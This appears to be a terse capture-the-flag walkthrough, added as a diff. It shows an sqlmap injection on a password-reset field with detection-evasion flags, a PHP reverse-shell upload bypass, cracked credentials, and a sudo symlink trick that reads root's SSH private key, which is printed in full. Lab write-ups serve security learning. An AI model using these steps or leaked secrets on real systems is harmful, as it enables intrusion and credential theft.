@@ -1,0 +1,63 @@
+Intercept (send password reset link)
+-------------------------------------
+
+#sqlmap -r req.txt -p email --level 5  --risk 3 --random-agent --chunked --dump
+
+
+--random-agent: This option tells sqlmap to use a randomly selected HTTP User-Agent header for each request, which can help evade detection.
+
+--chunked: This option instructs sqlmap to use chunked encoding in HTTP requests. Chunked encoding can help bypass some security measures.
+
+
+admin:whatever1
+
+
+CVE-2023-24249 (https://flyd.uk/post/cve-2023-24249/)
+-----------------------------------------------------
+
+Browse first , And then intercept and upload php-reverse-shell.php.jpg (first)
+Browse again , And then intercept and upload php-reverse-shell.php (second)
+
+
+allow admin(xander):3nc0d3d_pa$$w0rd
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+
+
+Backup file is always stored in /var/backups/project.zip, so we are in the folder called /var, but we can't create any file in eg./var, /var/www. So, that we have finally create file in /var/www/html.
+
+
+#cd /var/www/html
+#touch @file (customized file)
+#ln -sf /root/.ssh/id_rsa file (link the file)
+#sudo /usr/bin/usage_management
+
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+1
+
+Open archive: /var/backups/project.zip
+
+
+****GET SSH KEY****
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+ 
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+WARNING: No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+WARNING: No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+WARNING: No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+WARNING: No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+WARNING: No more files
+-----END OPENSSH PRIVATE KEY-----
+
+
+2b0b3a19252fdf45fa69243bd3c859f1
